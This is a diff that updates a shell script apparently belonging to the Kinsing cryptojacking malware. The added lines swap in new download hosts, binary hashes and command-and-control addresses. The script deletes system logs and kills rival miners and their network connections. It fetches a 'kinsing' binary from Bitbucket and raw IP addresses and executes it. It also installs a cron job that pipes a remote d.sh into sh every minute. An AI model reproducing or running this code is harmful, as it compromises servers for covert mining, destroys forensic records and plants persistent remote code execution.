@@ -1,0 +1,114 @@
+diff --git a/d.sh b/d.sh
+index da7f4e0..7584ff5 100644
+--- a/d.sh
++++ b/d.sh
+@@ -1,4 +1,5 @@
+ #!/bin/sh
++ulimit -n 65535
+ rm -rf /var/log/syslog
+ chattr -iua /tmp/
+ chattr -iua /var/tmp/
+@@ -51,6 +52,8 @@ netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -
+ netstat -anp | grep :14444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
+ netstat -anp | grep :14433 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
+ netstat -anp | grep :13531 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
++ps aux| grep "sleep 60"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
++ps aux| grep "./crun"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
+ ps aux | grep -vw kdevtmpfsi | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
+ ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
+ ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
+@@ -180,6 +183,11 @@ ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
+ ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
+ netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+ netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
++netstat -antp | grep '108.174.197.76' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
++netstat -antp | grep '192.236.161.6' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
++netstat -antp | grep '88.99.242.92' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
++pkill -f pastebin
++pkill -f 185.193.127.115
+ pgrep -f monerohash | xargs -I % kill -9 %
+ pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
+ pgrep -f xzpauectgr | xargs -I % kill -9 %
+@@ -528,7 +536,7 @@ if [ -e "/tmp/kinsing" ]; then
+       sum=$(md5sum /tmp/kinsing | awk '{ print $1 }')
+       echo $sum
+       case $sum in
+-      86657200ab3581889602434d2ef019e2)
++      a71ad3167f9402d8c5388910862b16ae)
+         echo "kinsing OK"
+         ;;
+       *)
+@@ -556,7 +564,7 @@ download() {
+     sum=$(md5sum $DIR/kinsing | awk '{ print $1 }')
+     echo $sum
+     case $sum in
+-    86657200ab3581889602434d2ef019e2)
++    a71ad3167f9402d8c5388910862b16ae)
+       echo "kinsing OK"
+       ;;
+     *)
+@@ -570,13 +578,13 @@ download() {
+   fi
+ }
+ download2() {
+-  $WGET $DIR/kinsing https://bitbucket.org/insane235n/git/raw/master/kinsing
++  $WGET $DIR/kinsing https://bitbucket.org/keronzj1/git/raw/master/kinsing
+   chmod +x $DIR/kinsing
+   if [ -x "$(command -v md5sum)" ]; then
+     sum=$(md5sum $DIR/kinsing | awk '{ print $1 }')
+     echo $sum
+     case $sum in
+-    86657200ab3581889602434d2ef019e2)
++    a71ad3167f9402d8c5388910862b16ae)
+       echo "kinsing OK"
+       ;;
+     *)
+@@ -591,13 +599,13 @@ download2() {
+ }
+ 
+ download3() {
+-  $WGET $DIR/kinsing http://185.92.74.42/kinsing
++  $WGET $DIR/kinsing http://45.10.88.74/kinsing
+   chmod +x $DIR/kinsing
+   if [ -x "$(command -v md5sum)" ]; then
+     sum=$(md5sum $DIR/kinsing | awk '{ print $1 }')
+     echo $sum
+     case $sum in
+-    86657200ab3581889602434d2ef019e2)
++    a71ad3167f9402d8c5388910862b16ae)
+       echo "kinsing OK"
+       ;;
+     *)
+@@ -610,15 +618,15 @@ download3() {
+ }
+ 
+ download
+-$DIR/kinsing
++SKL=d $DIR/kinsing
+ 
+-crontab -l | grep -e "185.92.74.42" | grep -v grep
++crontab -l | grep -e "195.3.146.118" | grep -v grep
+ if [ $? -eq 0 ]; then
+   echo "cron good"
+ else
+   (
+     crontab -l 2>/dev/null
+-    echo "* * * * * $LDR http://185.92.74.42/d.sh | sh > /dev/null 2>&1"
++    echo "* * * * * $LDR http://195.3.146.118/d.sh | sh > /dev/null 2>&1"
+   ) | crontab -
+ fi
+ 
+@@ -632,3 +640,13 @@ crontab -l | sed '/jpg/d' | crontab -
+ crontab -l | sed '/png/d' | crontab -
+ crontab -l | sed '/tmp/d' | crontab -
+ crontab -l | sed '/zmreplchkr/d' | crontab -
++crontab -l | sed '/aliyun.one/d' | crontab -
++crontab -l | sed '/3.215.110.66.one/d' | crontab -
++crontab -l | sed '/pastebin/d' | crontab -
++crontab -l | sed '/onion/d' | crontab -
++crontab -l | sed '/lsd.systemten.org/d' | crontab -
++crontab -l | sed '/shuf/d' | crontab -
++crontab -l | sed '/ash/d' | crontab -
++crontab -l | sed '/mr.sh/d' | crontab -
++crontab -l | sed '/185.181.10.234/d' | crontab -
++crontab -l | sed '/localhost.xyz/d' | crontab -
